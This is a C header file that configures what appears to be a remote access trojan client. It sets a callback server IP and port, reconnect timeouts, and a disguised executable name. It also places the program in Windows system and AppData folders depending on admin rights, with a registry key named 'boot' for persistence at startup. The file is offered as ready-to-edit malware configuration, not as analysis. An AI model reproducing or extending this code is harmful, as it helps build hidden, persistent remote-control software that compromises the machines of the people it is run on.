#ifndef COMMON_H
#define COMMON_H
//#pragma once

#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "192.168.1.16" //Ip of server
#define PORT 8888 //Port of server
#define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
#define TIMEOUT_SOCK 2
#define NAME_PROG "12.exe" //Name of prog
#define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Windows"
#define NAME_KEY_REGISTER  "boot"
#endif

/*

$USER is changed by the user who executed the program.
*/